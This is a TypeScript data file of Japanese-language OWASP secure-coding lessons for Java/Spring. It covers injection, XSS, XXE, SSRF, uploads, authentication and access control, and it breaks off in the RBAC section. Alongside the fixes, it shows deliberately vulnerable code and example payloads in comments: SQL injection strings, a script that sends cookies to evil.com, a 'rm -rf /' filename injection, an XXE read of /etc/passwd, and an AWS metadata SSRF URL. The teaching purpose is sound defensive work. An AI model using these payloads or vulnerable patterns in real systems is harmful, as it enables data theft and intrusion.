export interface OwaspSection {
  title: string;
  content: string;
  code?: string;
}

export interface OwaspChapter {
  id: string;
  title: string;
  description: string;
  category: string;
  sections: OwaspSection[];
}

export interface OwaspCategory {
  id: string;
  name: string;
  color: string;
}

export const owaspCategories: OwaspCategory[] = [
  { id: "injection", name: "インジェクション対策", color: "#DC2626" },
  { id: "auth", name: "認証・認可", color: "#2563EB" },
  { id: "data", name: "データ保護", color: "#059669" },
];

export const owaspChapters: OwaspChapter[] = [
  // ===== インジェクション対策 =====
  {
    id: "sql-injection",
    title: "SQLインジェクション対策",
    description:
      "SQLインジェクションの仕組みと、PreparedStatementやJPAを活用した安全なデータベースアクセスを学ぶ",
    category: "injection",
    sections: [
      {
        title: "脆弱なコード例",
        content:
          "SQLインジェクションは、ユーザー入力をそのままSQL文に組み込むことで発生する脆弱性です。攻撃者は入力値にSQL構文を挿入し、データベースを不正に操作できます。OWASP Top 10でも常に上位にランクされる最も危険な脆弱性の一つです。文字列連結でSQLを構築するコードは絶対に避けなければなりません。",
        code: `// ❌ 脆弱なコード - 文字列連結でSQLを構築
public User findUser(String username) {
    String sql = "SELECT * FROM users WHERE username = '"
        + username + "'";
    // 攻撃者が username に ' OR '1'='1 を入力すると
    // SELECT * FROM users WHERE username = '' OR '1'='1'
    // → 全ユーザーのデータが漏洩する
    return jdbcTemplate.queryForObject(sql, userRowMapper);
}

// ❌ 脆弱なコード - ログイン認証のバイパス
public boolean login(String user, String pass) {
    String sql = "SELECT COUNT(*) FROM users "
        + "WHERE username = '" + user
        + "' AND password = '" + pass + "'";
    // 攻撃者: user = admin'-- → パスワードチェックが無効化
    // SELECT COUNT(*) FROM users WHERE username = 'admin'--' AND password = ''
    int count = jdbcTemplate.queryForObject(sql, Integer.class);
    return count > 0;
}`,
      },
      {
        title: "PreparedStatementによる対策",
        content:
          "PreparedStatement（プリペアドステートメント）は、SQLインジェクションを防ぐ最も基本的かつ効果的な方法です。SQL文のパラメータをプレースホルダ（?）で指定し、値をバインドすることで、入力値がSQL構文として解釈されることを防ぎます。JDBCでもSpring JdbcTemplateでも、必ずパラメータバインディングを使用してください。",
        code: `// ✅ 安全なコード - PreparedStatementを使用
public User findUser(String username) {
    String sql = "SELECT * FROM users WHERE username = ?";
    try (PreparedStatement ps = connection.prepareStatement(sql)) {
        ps.setString(1, username);  // パラメータをバインド
        ResultSet rs = ps.executeQuery();
        if (rs.next()) {
            return mapToUser(rs);
        }
    }
    return null;
}

// ✅ Spring JdbcTemplate - 名前付きパラメータ
public List<User> searchUsers(String name, String role) {
    String sql = "SELECT * FROM users WHERE name LIKE :name AND role = :role";
    MapSqlParameterSource params = new MapSqlParameterSource()
        .addValue("name", "%" + name + "%")
        .addValue("role", role);
    return namedJdbcTemplate.query(sql, params, userRowMapper);
}

// ✅ IN句でも安全にバインド
public List<User> findByIds(List<Long> ids) {
    String sql = "SELECT * FROM users WHERE id IN (:ids)";
    MapSqlParameterSource params = new MapSqlParameterSource()
        .addValue("ids", ids);
    return namedJdbcTemplate.query(sql, params, userRowMapper);
}`,
      },
      {
        title: "JPAでの安全なクエリ",
        content:
          "Spring Data JPAを使用する場合、リポジトリメソッドの命名規約やJPQLのパラメータバインディングにより、自動的にSQLインジェクションが防止されます。ただし、ネイティブクエリで文字列連結を使う場合は依然として脆弱になり得るため注意が必要です。Criteria APIやSpecificationを使うことで、動的クエリも安全に構築できます。",
        code: `// ✅ Spring Data JPA - メソッド名による自動クエリ生成
@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    // SQLインジェクションの心配なし
    Optional<User> findByUsername(String username);
    List<User> findByRoleAndActiveTrue(String role);
}

// ✅ JPQLパラメータバインディング
@Repository
public interface OrderRepository extends JpaRepository<Order, Long> {
    @Query("SELECT o FROM Order o WHERE o.status = :status "
         + "AND o.createdAt >= :fromDate")
    List<Order> findByStatusAndDate(
        @Param("status") String status,
        @Param("fromDate") LocalDateTime fromDate
    );
}

// ✅ Criteria API - 動的クエリも安全に構築
public List<User> searchUsers(UserSearchCriteria criteria) {
    CriteriaBuilder cb = entityManager.getCriteriaBuilder();
    CriteriaQuery<User> query = cb.createQuery(User.class);
    Root<User> root = query.from(User.class);

    List<Predicate> predicates = new ArrayList<>();
    if (criteria.getName() != null) {
        predicates.add(cb.like(root.get("name"),
            "%" + criteria.getName() + "%"));
    }
    if (criteria.getRole() != null) {
        predicates.add(cb.equal(root.get("role"),
            criteria.getRole()));
    }
    query.where(predicates.toArray(new Predicate[0]));
    return entityManager.createQuery(query).getResultList();
}`,
      },
      {
        title: "入力バリデーション",
        content:
          "入力バリデーションは多層防御の一環として重要です。PreparedStatementと組み合わせることで、セキュリティをさらに強化できます。Bean Validationアノテーション（@NotBlank, @Size, @Patternなど）を使用して、アプリケーション層で不正な入力を早期に弾きましょう。ホワイトリスト方式（許可する文字列のパターンを定義）が推奨されます。",
        code: `// ✅ Bean Validationによる入力チェック
public class UserRegistrationRequest {
    @NotBlank(message = "ユーザー名は必須です")
    @Size(min = 3, max = 50, message = "3〜50文字で入力してください")
    @Pattern(regexp = "^[a-zA-Z0-9_]+$",
             message = "英数字とアンダースコアのみ使用可能です")
    private String username;

    @NotBlank
    @Email(message = "有効なメールアドレスを入力してください")
    private String email;

    @NotBlank
    @Size(min = 8, max = 100)
    private String password;
}

// ✅ コントローラーでバリデーション実行
@RestController
@RequestMapping("/api/users")
public class UserController {
    @PostMapping("/register")
    public ResponseEntity<?> register(
            @Valid @RequestBody UserRegistrationRequest request,
            BindingResult result) {
        if (result.hasErrors()) {
            List<String> errors = result.getFieldErrors().stream()
                .map(e -> e.getField() + ": " + e.getDefaultMessage())
                .collect(Collectors.toList());
            return ResponseEntity.badRequest().body(errors);
        }
        return ResponseEntity.ok(userService.register(request));
    }
}

// ✅ カスタムバリデータ - ホワイトリスト方式
@Component
public class InputSanitizer {
    private static final Pattern SAFE_STRING =
        Pattern.compile("^[\\\\p{L}\\\\p{N}\\\\s\\\\-_.@]+$");

    public boolean isSafe(String input) {
        return input != null && SAFE_STRING.matcher(input).matches();
    }
}`,
      },
    ],
  },
  {
    id: "xss",
    title: "XSS（クロスサイトスクリプティング）対策",
    description:
      "XSS攻撃の種類と、テンプレートエンジンやCSPを活用した効果的な防御方法を学ぶ",
    category: "injection",
    sections: [
      {
        title: "Reflected / Stored / DOM-based XSS",
        content:
          "XSS（クロスサイトスクリプティング）は、Webページに悪意のあるスクリプトを挿入する攻撃です。Reflected XSSはURLパラメータ経由、Stored XSSはデータベースに保存された悪意ある入力経由、DOM-based XSSはクライアントサイドのJavaScript処理の脆弱性を悪用します。いずれもユーザーのセッション情報の窃取やフィッシングに利用されます。",
        code: `// ❌ Reflected XSS - 脆弱なコード
// リクエスト: /search?q=<script>alert('XSS')</script>
@GetMapping("/search")
public String search(@RequestParam String q, Model model) {
    model.addAttribute("query", q);
    return "search";  // テンプレートでエスケープしないと危険
}

// ❌ Stored XSS - 脆弱なコード
// コメントにスクリプトが保存される
@PostMapping("/comments")
public String addComment(@RequestParam String body) {
    Comment comment = new Comment();
    comment.setBody(body);  // <script>document.location='http://evil.com/steal?c='+document.cookie</script>
    commentRepository.save(comment);  // DBに悪意あるスクリプトが保存される
    return "redirect:/comments";
}

// ❌ DOM-based XSS - 脆弱なJavaScript
// <script>
//   const name = new URLSearchParams(window.location.search).get('name');
//   document.getElementById('greeting').innerHTML = 'こんにちは、' + name;
//   // name に <img src=x onerror=alert('XSS')> を設定されると実行される
// </script>`,
      },
      {
        title: "Thymeleafでの自動エスケープ",
        content:
          "Thymeleafテンプレートエンジンは、th:text属性を使用すると自動的にHTMLエスケープを行います。これにより、ユーザー入力に含まれるHTMLタグやスクリプトが無害化されます。ただし、th:utextはエスケープしないため、信頼できないデータには絶対に使わないでください。JavaScriptコンテキストへの出力にも注意が必要です。",
        code: `<!-- ✅ Thymeleaf - th:text は自動エスケープ -->
<p th:text="\${userInput}">ここにユーザー入力が安全に表示される</p>
<!-- <script>alert('XSS')</script> → &lt;script&gt;alert('XSS')&lt;/script&gt; -->

<!-- ❌ th:utext はエスケープしない - 信頼できないデータには使わない -->
<p th:utext="\${userInput}">危険！スクリプトが実行される</p>

<!-- ✅ 属性値も安全にバインド -->
<a th:href="@{/users/{id}(id=\${user.id})}">プロフィール</a>
<img th:src="@{/images/{file}(file=\${imageName})}" />

<!-- ✅ JavaScriptコンテキストへの安全な出力 -->
<script th:inline="javascript">
    // Thymeleafが自動的にJavaScript文字列としてエスケープ
    var userName = /*[[*{name}]]*/ "default";
    var userId = /*[[*{id}]]*/ 0;
</script>

<!-- ✅ Spring MVCでのレスポンスヘッダー設定 -->
// Content-Typeを正しく設定
@GetMapping(value = "/api/data",
            produces = MediaType.APPLICATION_JSON_VALUE)
@ResponseBody
public Map<String, String> getData() {
    return Map.of("message", "安全なレスポンス");
}`,
      },
      {
        title: "Content Security Policy (CSP)",
        content:
          "Content Security Policy（CSP）は、ブラウザがどのソースからリソースを読み込めるかを制御するHTTPヘッダーです。インラインスクリプトの実行を禁止し、許可されたドメインからのみスクリプトを読み込むよう制限することで、XSS攻撃の影響を大幅に軽減できます。Spring Securityで簡単に設定できます。",
        code: `// ✅ Spring Security でCSPを設定
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http)
            throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "default-src 'self'; "
                        + "script-src 'self' 'nonce-{random}'; "
                        + "style-src 'self' 'unsafe-inline'; "
                        + "img-src 'self' data:; "
                        + "font-src 'self'; "
                        + "connect-src 'self' https://api.example.com; "
                        + "frame-ancestors 'none'; "
                        + "form-action 'self'"
                    )
                )
                // X-Content-Type-Options: nosniff
                .contentTypeOptions(Customizer.withDefaults())
                // X-Frame-Options: DENY
                .frameOptions(frame -> frame.deny())
            );
        return http.build();
    }
}

// ✅ CSP Nonce を使ったインラインスクリプト許可
@Component
public class CspNonceFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest request,
            HttpServletResponse response, FilterChain chain)
            throws ServletException, IOException {
        String nonce = UUID.randomUUID().toString();
        request.setAttribute("cspNonce", nonce);
        response.setHeader("Content-Security-Policy",
            "script-src 'self' 'nonce-" + nonce + "'");
        chain.doFilter(request, response);
    }
}`,
      },
      {
        title: "サニタイゼーション",
        content:
          "サニタイゼーション（無害化）は、ユーザー入力からHTML/JavaScriptの危険な部分を除去または変換する処理です。OWASP Java HTML Sanitizerや jsoup などのライブラリを使い、許可するHTMLタグを明示的に指定するホワイトリスト方式が推奨されます。リッチテキスト入力が必要な場合に特に重要です。",
        code: `// ✅ OWASP Java HTML Sanitizer
// build.gradle: implementation 'com.googlecode.owasp-java-html-sanitizer:owasp-java-html-sanitizer:20220608.1'
import org.owasp.html.PolicyFactory;
import org.owasp.html.Sanitizers;

@Service
public class HtmlSanitizeService {

    // 許可するHTML要素を定義（ホワイトリスト方式）
    private static final PolicyFactory POLICY =
        Sanitizers.FORMATTING          // b, i, em, strong
            .and(Sanitizers.LINKS)     // a href
            .and(Sanitizers.BLOCKS)    // p, div, h1-h6
            .and(Sanitizers.TABLES);   // table, tr, td

    public String sanitize(String untrustedHtml) {
        return POLICY.sanitize(untrustedHtml);
        // <script>alert('XSS')</script><b>太字</b>
        // → <b>太字</b>  (scriptタグは除去)
    }
}

// ✅ jsoup でのサニタイゼーション
import org.jsoup.Jsoup;
import org.jsoup.safety.Safelist;

@Service
public class ContentSanitizer {
    public String sanitize(String html) {
        return Jsoup.clean(html, Safelist.basic());
        // basic: a, b, blockquote, br, cite, code, dd,
        //        dl, dt, em, i, li, ol, p, pre, q, small,
        //        span, strike, strong, sub, sup, u, ul
    }

    public String sanitizeRelaxed(String html) {
        // カスタムルール: 画像も許可
        Safelist safelist = Safelist.relaxed()
            .addAttributes("img", "alt", "title")
            .addProtocols("img", "src", "https");
        return Jsoup.clean(html, safelist);
    }
}`,
      },
    ],
  },
  {
    id: "command-injection",
    title: "コマンドインジェクション/XXE対策",
    description:
      "OSコマンドインジェクション、XML外部エンティティ攻撃、SSRF、ファイルアップロードの脆弱性と対策を学ぶ",
    category: "injection",
    sections: [
      {
        title: "ProcessBuilderの安全な利用",
        content:
          "コマンドインジェクションは、ユーザー入力をOSコマンドの一部として実行してしまう脆弱性です。Runtime.exec()に文字列を直接渡すのは危険です。ProcessBuilderを使い、コマンドと引数を分離して渡すことで、シェル解釈による攻撃を防止できます。そもそもOS コマンド実行を避けるのが最善ですが、必要な場合は入力の厳密なバリデーションも併用しましょう。",
        code: `// ❌ 脆弱なコード - シェル経由でコマンド実行
public String convertImage(String filename) {
    // 攻撃者: filename = "img.png; rm -rf /"
    String cmd = "convert " + filename + " output.png";
    Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    return "output.png";
}

// ✅ 安全なコード - ProcessBuilderで引数を分離
public String convertImageSafe(String filename) {
    // ファイル名のバリデーション
    if (!filename.matches("^[a-zA-Z0-9_\\\\-]+\\\\.(png|jpg|gif)$")) {
        throw new IllegalArgumentException("不正なファイル名です");
    }

    ProcessBuilder pb = new ProcessBuilder(
        "convert", filename, "output.png"  // 引数を分離
    );
    pb.directory(new File("/app/uploads"));
    pb.redirectErrorStream(true);

    Process process = pb.start();
    int exitCode = process.waitFor();
    if (exitCode != 0) {
        throw new RuntimeException("変換に失敗しました");
    }
    return "output.png";
}

// ✅ より安全 - Javaライブラリで代替
// OSコマンドの代わりにJavaライブラリを使用
public byte[] resizeImage(byte[] imageData, int width, int height) {
    BufferedImage original = ImageIO.read(
        new ByteArrayInputStream(imageData));
    BufferedImage resized = new BufferedImage(
        width, height, BufferedImage.TYPE_INT_RGB);
    Graphics2D g = resized.createGraphics();
    g.drawImage(original, 0, 0, width, height, null);
    g.dispose();
    ByteArrayOutputStream out = new ByteArrayOutputStream();
    ImageIO.write(resized, "png", out);
    return out.toByteArray();
}`,
      },
      {
        title: "XML外部エンティティ (XXE) 防止",
        content:
          "XXE（XML External Entity）攻撃は、XMLパーサーが外部エンティティを処理する機能を悪用し、サーバー上のファイルを読み取ったり、SSRF攻撃を行ったりする脆弱性です。XMLパーサーの設定で外部エンティティの処理を無効化することが最も効果的な対策です。可能であれば、XMLの代わりにJSONを使用することも検討してください。",
        code: `// ❌ 脆弱なXML - 攻撃者が送信するXMLの例
// <?xml version="1.0"?>
// <!DOCTYPE foo [
//   <!ENTITY xxe SYSTEM "file:///etc/passwd">
// ]>
// <user><name>&xxe;</name></user>
// → サーバーの /etc/passwd が読み取られる

// ✅ DocumentBuilderFactory - XXE対策
public Document parseXmlSafely(InputStream xmlInput)
        throws Exception {
    DocumentBuilderFactory dbf =
        DocumentBuilderFactory.newInstance();

    // 外部エンティティを無効化
    dbf.setFeature(
        "http://apache.org/xml/features/disallow-doctype-decl",
        true);
    dbf.setFeature(
        "http://xml.org/sax/features/external-general-entities",
        false);
    dbf.setFeature(
        "http://xml.org/sax/features/external-parameter-entities",
        false);
    dbf.setXIncludeAware(false);
    dbf.setExpandEntityReferences(false);

    DocumentBuilder db = dbf.newDocumentBuilder();
    return db.parse(xmlInput);
}

// ✅ SAXParserFactory - XXE対策
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature(
    "http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature(
    "http://xml.org/sax/features/external-general-entities", false);

// ✅ Jackson XML（推奨） - デフォルトで安全
XmlMapper xmlMapper = new XmlMapper();
User user = xmlMapper.readValue(xmlString, User.class);`,
      },
      {
        title: "SSRF対策",
        content:
          "SSRF（Server-Side Request Forgery）は、攻撃者がサーバーに内部ネットワークへのリクエストを発行させる攻撃です。URLをユーザー入力として受け取る機能（Webhook、URL取得機能など）で発生します。内部IPアドレスへのアクセスを禁止するバリデーション、許可リストの使用、ネットワークレベルでの制限が有効な対策です。",
        code: `// ❌ 脆弱なコード - ユーザー指定URLに無制限にアクセス
@GetMapping("/fetch")
public String fetchUrl(@RequestParam String url) {
    // 攻撃者: url = http://169.254.169.254/latest/meta-data/
    // → AWSメタデータからIAMクレデンシャルが漏洩
    return restTemplate.getForObject(url, String.class);
}

// ✅ 安全なコード - URLバリデーション
@Service
public class SafeUrlFetcher {

    private static final Set<String> ALLOWED_HOSTS = Set.of(
        "api.example.com", "cdn.example.com"
    );

    public String fetchUrl(String urlString) {
        try {
            URL url = new URL(urlString);

            // プロトコルチェック
            if (!url.getProtocol().equals("https")) {
                throw new SecurityException("HTTPSのみ許可されています");
            }

            // ホストの許可リストチェック
            if (!ALLOWED_HOSTS.contains(url.getHost())) {
                throw new SecurityException("許可されていないホストです");
            }

            // 内部IPアドレスのブロック
            InetAddress addr = InetAddress.getByName(url.getHost());
            if (addr.isLoopbackAddress()
                    || addr.isSiteLocalAddress()
                    || addr.isLinkLocalAddress()) {
                throw new SecurityException(
                    "内部アドレスへのアクセスは禁止されています");
            }

            return restTemplate.getForObject(urlString, String.class);
        } catch (MalformedURLException | UnknownHostException e) {
            throw new IllegalArgumentException("無効なURLです");
        }
    }
}`,
      },
      {
        title: "ファイルアップロードの安全化",
        content:
          "ファイルアップロード機能は、悪意あるファイルの実行、パストラバーサル、サービス拒否（巨大ファイル）など複数のリスクがあります。ファイルサイズの制限、MIMEタイプの検証、ファイル名のサニタイズ、保存先ディレクトリの制限、ウイルススキャンなど、多層的な防御が必要です。",
        code: `// ✅ 安全なファイルアップロード実装
@RestController
@RequestMapping("/api/files")
public class FileUploadController {

    private static final long MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB
    private static final Set<String> ALLOWED_TYPES = Set.of(
        "image/jpeg", "image/png", "image/gif", "application/pdf"
    );
    private static final Set<String> ALLOWED_EXTENSIONS = Set.of(
        "jpg", "jpeg", "png", "gif", "pdf"
    );

    @PostMapping("/upload")
    public ResponseEntity<?> upload(
            @RequestParam("file") MultipartFile file) {
        // 1. サイズチェック
        if (file.getSize() > MAX_FILE_SIZE) {
            return ResponseEntity.badRequest()
                .body("ファイルサイズが上限を超えています");
        }

        // 2. MIMEタイプ検証（Content-Typeヘッダーだけでなく実際の中身も）
        String contentType = file.getContentType();
        if (!ALLOWED_TYPES.contains(contentType)) {
            return ResponseEntity.badRequest()
                .body("許可されていないファイル形式です");
        }

        // 3. 拡張子チェック
        String originalName = file.getOriginalFilename();
        String extension = FilenameUtils
            .getExtension(originalName).toLowerCase();
        if (!ALLOWED_EXTENSIONS.contains(extension)) {
            return ResponseEntity.badRequest()
                .body("許可されていない拡張子です");
        }

        // 4. ファイル名をランダムに生成（パストラバーサル防止）
        String safeName = UUID.randomUUID() + "." + extension;
        Path uploadDir = Paths.get("/app/uploads").toAbsolutePath();
        Path targetPath = uploadDir.resolve(safeName).normalize();

        // 5. パストラバーサル最終チェック
        if (!targetPath.startsWith(uploadDir)) {
            throw new SecurityException("不正なファイルパスです");
        }

        Files.copy(file.getInputStream(), targetPath);
        return ResponseEntity.ok(Map.of("filename", safeName));
    }
}`,
      },
    ],
  },
  // ===== 認証・認可 =====
  {
    id: "broken-auth",
    title: "認証の脆弱性",
    description:
      "パスワード管理、セッション管理、CSRF対策、多要素認証など認証に関わるセキュリティ対策を学ぶ",
    category: "auth",
    sections: [
      {
        title: "パスワードハッシュ (BCrypt)",
        content:
          "パスワードは平文やMD5/SHA-1で保存してはいけません。BCryptのようなアダプティブハッシュ関数を使い、ソルト付きでハッシュ化して保存します。Spring Securityが提供するBCryptPasswordEncoderを使えば、ソルト生成やストレッチングが自動的に行われます。パスワードの強度ポリシーも合わせて実装しましょう。",
        code: `// ❌ 脆弱なパスワード保存
public void saveUser(String username, String password) {
    // MD5は高速すぎてブルートフォースに弱い
    String hash = DigestUtils.md5DigestAsHex(
        password.getBytes());
    userRepository.save(new User(username, hash));
}

// ✅ BCryptを使用した安全なパスワード保存
@Configuration
public class PasswordConfig {
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder(12); // コストファクター12
    }
}

@Service
public class UserService {
    private final PasswordEncoder passwordEncoder;
    private final UserRepository userRepository;

    public void registerUser(String username, String rawPassword) {
        // パスワード強度チェック
        validatePasswordStrength(rawPassword);

        // BCryptでハッシュ化（ソルトは自動生成）
        String encoded = passwordEncoder.encode(rawPassword);
        // 結果例: $2a$12$LJ3m4ys3Rr...（ソルト込み）
        userRepository.save(new User(username, encoded));
    }

    public boolean verifyPassword(String raw, String encoded) {
        return passwordEncoder.matches(raw, encoded);
    }

    private void validatePasswordStrength(String password) {
        if (password.length() < 8) {
            throw new WeakPasswordException("8文字以上必要です");
        }
        if (!password.matches(".*[A-Z].*")) {
            throw new WeakPasswordException("大文字を含めてください");
        }
        if (!password.matches(".*[0-9].*")) {
            throw new WeakPasswordException("数字を含めてください");
        }
        if (!password.matches(".*[!@#$%^&*].*")) {
            throw new WeakPasswordException("記号を含めてください");
        }
    }
}`,
      },
      {
        title: "セッション管理",
        content:
          "セッション管理の脆弱性は、セッションIDの推測やセッション固定攻撃などを通じてアカウント乗っ取りにつながります。Spring Securityはログイン成功時にセッションIDを自動再生成し、セッション固定攻撃を防止します。セッションのタイムアウト設定、同時セッション数の制限、Cookieのセキュア属性の設定も重要です。",
        code: `// ✅ Spring Security セッション設定
@Configuration
@EnableWebSecurity
public class SessionSecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http)
            throws Exception {
        http
            .sessionManagement(session -> session
                // セッション固定攻撃対策（デフォルトで有効）
                .sessionFixation().changeSessionId()
                // 同時セッション数を1に制限
                .maximumSessions(1)
                // 新規ログインで既存セッションを無効化
                .maxSessionsPreventsLogin(false)
                .expiredUrl("/login?expired")
            );
        return http.build();
    }
}

// ✅ application.yml - セッションCookie設定
// server:
//   servlet:
//     session:
//       timeout: 30m        # 30分でタイムアウト
//       cookie:
//         http-only: true   # JavaScriptからアクセス不可
//         secure: true      # HTTPS接続でのみ送信
//         same-site: strict # CSRF対策

// ✅ ログアウト時のセッション無効化
@PostMapping("/logout")
public String logout(HttpServletRequest request) {
    HttpSession session = request.getSession(false);
    if (session != null) {
        session.invalidate();  // セッションを完全に無効化
    }
    SecurityContextHolder.clearContext();
    return "redirect:/login?logout";
}

// ✅ セッション情報の安全な保存（Redis）
// spring:
//   session:
//     store-type: redis
//   redis:
//     host: localhost
//     port: 6379`,
      },
      {
        title: "CSRF対策 (Spring Security)",
        content:
          "CSRF（クロスサイトリクエストフォージェリ）は、認証済みユーザーのブラウザから意図しないリクエストを送信させる攻撃です。Spring Securityはデフォルトでトークン方式のCSRF対策を提供しています。SPAの場合はCookieToHeaderTokenRepositoryを使用し、リクエストヘッダーでトークンを送信する方式が一般的です。",
        code: `// ✅ Spring Security - CSRF保護（デフォルトで有効）
@Configuration
@EnableWebSecurity
public class CsrfConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http)
            throws Exception {
        http
            // MPA（サーバーサイドレンダリング）の場合
            .csrf(csrf -> csrf
                .csrfTokenRepository(
                    HttpSessionCsrfTokenRepository())
            );
        return http.build();
    }
}

<!-- Thymeleafフォームでの自動CSRFトークン埋め込み -->
<form th:action="@{/transfer}" method="post">
    <!-- Thymeleafが自動的にCSRFトークンを埋め込む -->
    <input type="text" name="amount" />
    <button type="submit">送金</button>
</form>

// ✅ SPA（REST API）の場合
@Bean
public SecurityFilterChain apiFilterChain(HttpSecurity http)
        throws Exception {
    http
        .csrf(csrf -> csrf
            // Cookieにトークンを設定し、ヘッダーで返す方式
            .csrfTokenRepository(
                CookieServerCsrfTokenRepository.withHttpOnlyFalse())
            .csrfTokenRequestHandler(
                new CsrfTokenRequestAttributeHandler())
        );
    return http.build();
}

// フロントエンド（JavaScript）でのCSRFトークン送信
// const token = document.cookie
//     .split('; ')
//     .find(row => row.startsWith('XSRF-TOKEN='))
//     ?.split('=')[1];
// fetch('/api/transfer', {
//     method: 'POST',
//     headers: {
//         'X-XSRF-TOKEN': token,
//         'Content-Type': 'application/json'
//     },
//     body: JSON.stringify({ amount: 1000 })
// });`,
      },
      {
        title: "多要素認証 (MFA)",
        content:
          "多要素認証（MFA）は、パスワードに加えて追加の認証要素を要求することで、認証のセキュリティを大幅に強化します。TOTP（Time-based One-Time Password）が広く使われており、Google AuthenticatorやMicrosoft Authenticatorなどのアプリと連携できます。Spring Securityのカスタム認証フィルターで実装可能です。",
        code: `// ✅ TOTP（Time-based One-Time Password）実装
// build.gradle: implementation 'dev.samstevens.totp:totp:1.7.1'

@Service
public class TotpService {
    private final SecretGenerator secretGenerator =
        new DefaultSecretGenerator();
    private final CodeVerifier codeVerifier =
        new DefaultCodeVerifier(
            new DefaultCodeGenerator(), new SystemTimeProvider());

    // 1. MFA登録 - シークレットキー生成
    public String generateSecret() {
        return secretGenerator.generate();
    }

    // 2. QRコードURL生成（Google Authenticator用）
    public String getQrCodeUrl(String secret, String email) {
        QrData data = new QrData.Builder()
            .label(email)
            .secret(secret)
            .issuer("MyApp")
            .algorithm(HashingAlgorithm.SHA1)
            .digits(6)
            .period(30)
            .build();
        QrGenerator generator = new ZxingPngQrGenerator();
        byte[] imageData = generator.generate(data);
        return "data:image/png;base64,"
            + Base64.getEncoder().encodeToString(imageData);
    }

    // 3. TOTPコードの検証
    public boolean verifyCode(String secret, String code) {
        return codeVerifier.isValidCode(secret, code);
    }
}

// ✅ MFA認証フィルター
@Component
public class MfaAuthFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest request,
            HttpServletResponse response, FilterChain chain)
            throws ServletException, IOException {
        Authentication auth =
            SecurityContextHolder.getContext().getAuthentication();
        if (auth != null && auth.isAuthenticated()) {
            User user = (User) auth.getPrincipal();
            if (user.isMfaEnabled()
                    && !isMfaVerified(request.getSession())) {
                response.sendRedirect("/mfa/verify");
                return;
            }
        }
        chain.doFilter(request, response);
    }

    private boolean isMfaVerified(HttpSession session) {
        return Boolean.TRUE.equals(
            session.getAttribute("MFA_VERIFIED"));
    }
}`,
      },
    ],
  },
  {
    id: "access-control",
    title: "アクセス制御",
    description:
      "権限チェック、IDOR防止、ロールベースアクセス制御、API認可設計のベストプラクティスを学ぶ",
    category: "auth",
    sections: [
      {
        title: "権限チェックの実装 (@PreAuthorize)",
        content:
          "Spring Securityの@PreAuthorizeアノテーションを使うと、メソッドレベルで宣言的に権限チェックを実装できます。SpEL（Spring Expression Language）で柔軟な条件式を記述でき、ロールベースやパーミッションベースの制御が可能です。@PostAuthorizeでは戻り値に基づく制御も行えます。メソッドセキュリティを有効にするには@EnableMethodSecurityが必要です。",
        code: `// ✅ メソッドセキュリティの有効化
@Configuration
@EnableMethodSecurity(prePostEnabled = true)
public class MethodSecurityConfig {
}

// ✅ @PreAuthorize によるロールベース制御
@RestController
@RequestMapping("/api/admin")
public class AdminController {

    @PreAuthorize("hasRole('ADMIN')")
    @GetMapping("/users")
    public List<User> getAllUsers() {
        return userService.findAll();
    }

    @PreAuthorize("hasAnyRole('ADMIN', 'MANAGER')")
    @GetMapping("/reports")
    public List<Report> getReports() {
        return reportService.findAll();
    }

    // SpEL式でパラメータを参照
    @PreAuthorize("#userId == authentication.principal.id "
                + "or hasRole('ADMIN')")
    @GetMapping("/users/{userId}")
    public User getUser(@PathVariable Long userId) {
        return userService.findById(userId);
    }
}

// ✅ @PostAuthorize - 戻り値に基づく制御
@PostAuthorize("returnObject.owner == authentication.name")
public Document getDocument(Long documentId) {
    return documentRepository.findById(documentId)
        .orElseThrow();
}

// ✅ カスタムセキュリティ式
@Component("authz")
public class AuthorizationService {
    public boolean isResourceOwner(Long resourceId,
                                    Authentication auth) {
        Resource resource = resourceRepository
            .findById(resourceId).orElse(null);
        return resource != null
            && resource.getOwnerId().equals(
                ((CustomUser) auth.getPrincipal()).getId());
    }
}

// @PreAuthorize("@authz.isResourceOwner(#id, authentication)")
// public Resource getResource(@PathVariable Long id) { ... }`,
      },
      {
        title: "IDOR（不安全な直接オブジェクト参照）防止",
        content:
          "IDOR（Insecure Direct Object Reference）は、URLパラメータやリクエストボディのIDを改ざんすることで、他のユーザーのデータにアクセスできてしまう脆弱性です。必ずサーバーサイドで現在のユーザーがそのリソースにアクセスする権限を持っているか検証してください。連番IDの代わりにUUIDを使用することも有効な対策です。",
        code: `// ❌ 脆弱なコード - IDORの例
@GetMapping("/api/orders/{orderId}")
public Order getOrder(@PathVariable Long orderId) {
    // 他人の注文も ID を変えるだけで閲覧可能
    return orderRepository.findById(orderId).orElseThrow();
}

// ✅ 安全なコード - 所有者チェック
@GetMapping("/api/orders/{orderId}")
public Order getOrder(@PathVariable Long orderId,
                      Authentication auth) {
    Order order = orderRepository.findById(orderId)
        .orElseThrow(() ->
            new ResponseStatusException(HttpStatus.NOT_FOUND));

    // 現在のユーザーが所有者であることを確認
    Long currentUserId = ((CustomUser) auth.getPrincipal()).getId();
    if (!order.getUserId().equals(currentUserId)) {
        // 403ではなく404を返す（リソースの存在を隠す）
        throw new ResponseStatusException(HttpStatus.NOT_FOUND);
    }
    return order;
}

// ✅ リポジトリレベルで制限
@Repository
public interface OrderRepository extends JpaRepository<Order, Long> {
    // ユーザーIDとの組み合わせで検索
    Optional<Order> findByIdAndUserId(Long id, Long userId);

    // Spring Data JPAの@Queryで制限
    @Query("SELECT o FROM Order o WHERE o.id = :id "
         + "AND o.user.id = :userId")
    Optional<Order> findByIdForUser(
        @Param("id") Long id,
        @Param("userId") Long userId);
}

// ✅ UUIDを使用してIDの推測を困難にする
@Entity
public class Order {
    @Id
    @GeneratedValue(strategy = GenerationType.UUID)
    private UUID id;  // 連番ではなくUUID
}`,
      },
      {
        title: "ロールベースアクセス制御 (RBAC)",
        content:
